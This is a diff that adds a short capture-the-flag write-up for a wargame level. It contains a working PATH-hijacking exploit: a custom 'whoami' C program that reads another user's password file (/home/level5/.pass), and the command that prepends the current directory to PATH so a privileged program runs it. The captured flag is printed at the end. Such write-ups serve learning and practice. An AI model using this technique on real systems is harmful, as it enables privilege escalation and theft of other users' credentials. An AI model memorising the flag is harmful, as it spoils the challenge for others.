@@ -1,0 +1,26 @@
+Problem:
+
+C program which calls whoami, need to override system whoami with custom program to print out flag
+
+whoami.c
+----------
+#include <stdio.h>
+#include <errno.h>
+#include <stdlib.h>
+
+void main() {
+    int c;
+    FILE *file = file = fopen("/home/level5/.pass", "r");
+    if(file) {
+        while((c = getc(file)) != EOF)
+            putchar(c);
+        fclose(file);
+    }
+}
+---------
+
+While in temp folder which contains whoami executable run:
+PATH=.:$PATH /levels/level04
+
+Flag:
+LOoCy5PbKi63qXTh
